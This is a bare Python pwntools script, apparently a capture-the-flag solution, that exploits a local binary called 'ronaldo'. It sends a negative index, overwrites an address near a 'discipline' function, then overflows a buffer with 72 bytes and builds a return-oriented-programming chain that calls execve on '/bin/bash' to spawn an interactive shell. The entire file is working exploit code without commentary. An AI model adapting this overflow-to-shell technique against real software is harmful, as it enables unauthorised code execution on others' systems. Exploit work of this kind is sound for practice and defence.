from pwn import *

pr = process('./ronaldo')
elf = context.binary = ELF('./ronaldo', checksec=False)
rop = ROP(elf)

binbash = next(elf.search(b'/bin/bash'))
print(hex(binbash))

pr.sendline(b'-4')

payload = (p64(elf.symbols['discipline'] + 4))
pr.send(payload)


rop.raw(b'A' * 72)

rop.rdi = binbash  
rop.rsi = 0
rop.rdx = 0
rop.rax = 59
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])


pr.send(rop.chain())
print(rop.chain())


pr.interactive()